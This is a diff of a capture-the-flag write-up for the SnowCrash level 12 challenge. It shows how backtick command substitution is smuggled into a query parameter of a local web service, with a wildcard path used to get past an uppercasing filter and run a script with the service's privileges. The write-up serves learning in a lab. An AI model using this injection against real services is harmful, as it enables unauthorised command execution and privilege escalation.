@@ -83,31 +83,29 @@ Problem: if we pass just `getflag`, the regex will turn it into GETFLAG and the 
 Maybe we can run a script instead of a command and using wildcards will prevent the regex to turn `/tmp/` into `/TMP/` wich doesn't exist.
 
 ```bash
-echo "getflag" > /tmp/GETFLAG
-touch /tmp/CC
-chmod 777 /tmp/GETFLAG
+level12@SnowCrash:~$ echo 'getflag' > /tmp/GETFLAG
+level12@SnowCrash:~$ touch /tmp/CC
+level12@SnowCrash:~$ chmod 777 /tmp/GETFLAG
+level12@SnowCrash:~$ curl localhost:4646/?x="`/*/GETFLAG>/*/CC`"
+..level12@SnowCrash:~$ cat /tmp/CC
+Check flag.Here is your token :
+Nope there is no token here for you sorry. Try again :)
 ```
-```bash
-curl localhost:4646/?x="`/*/GETFLAG>/*/CC`"
-```
-
 This does not work, it launch getflag without the appropriate rights.
 
 1h30 later with lot of different useless tries...
-It was not the good quotes, and weird to do it like this, it is cleaner to do the > part into the script.
+It was not the good quotes, and why not do the > part into the script.
 https://stackoverflow.com/questions/6697753/difference-between-single-and-double-quotes-in-bash
 https://www.howtogeek.com/howto/29980/whats-the-difference-between-single-and-double-quotes-in-the-bash-shell/
 
-#@ Solution
+## Solution
 
 ```
-cat /tmp/GETFLAG
+level12@SnowCrash:~$ cat /tmp/GETFLAG
 #!/bin/bash
 getflag > /tmp/flag
-
-touch /tmp/flag
-chmod 777 /tmp/GETFLAG
-
-curl localhost:4646?x='`/*/GETFLAG`' 
+level12@SnowCrash:~$ touch /tmp/flag
+level12@SnowCrash:~$ chmod 777 /tmp/GETFLAG
+level12@SnowCrash:~$ curl localhost:4646?x='`/*/GETFLAG`' 
 ```
 Gives us the flag.
